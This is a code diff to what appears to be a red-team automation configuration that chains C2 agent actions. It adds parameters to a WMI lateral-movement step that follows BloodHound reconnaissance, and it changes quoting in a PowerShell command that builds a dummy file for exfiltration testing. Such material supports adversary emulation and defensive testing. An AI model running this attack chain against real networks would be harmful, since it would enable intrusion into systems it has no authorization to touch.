@@ -405,8 +405,18 @@ action "execute_agent_module" "invoke_wmi" {
     depends_on        = action.execute_agent_module.bloodhound
 
     module_args = {
-        ComputerName = data.tasks.lateral_movement_task.local_ip.0
-        Listener     = resource.task.c2_task.listener.name
+        ComputerName     = data.tasks.lateral_movement_task.local_ip.0
+        Listener         = resource.task.c2_task.listener.name
+        Command          = ""
+        CredID           = "" 
+        Obfuscate        = "" 
+        ObfuscateCommand = "" 
+        Bypasses         = "" 
+        UserName         = "" 
+        Password         = "" 
+        UserAgent        = "" 
+        Proxy            = "" 
+        ProxyCreds       = "" 
     }
 }
 
@@ -414,7 +424,7 @@ action "execute_agent_shell_command" "create_exfil_file" {
     delay             = "15"
     task_name         = resource.task.c2_task.task_name
     agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
-    command           = "New-Item ${variable.exfil_path}\\${variable.exfil_file}; while((Get-Item -Path ${variable.exfil_path}\\${variable.exfil_file}).Length/1MB -le ${variable.exfil_size}){\"1234567890qwertyasdfjkl;\"*1048576 >> ${variable.exfil_path}\\${variable.exfil_file}}"
+    command           = "New-Item ${variable.exfil_path}\\${variable.exfil_file}; while((Get-Item -Path ${variable.exfil_path}\\${variable.exfil_file}).Length/1MB -le ${variable.exfil_size}){'1234567890qwertyasdfjkl;'*1048576 >> ${variable.exfil_path}\\${variable.exfil_file}}"
     wait_for_results  = "true"
     depends_on        = action.execute_agent_module.invoke_wmi
 }
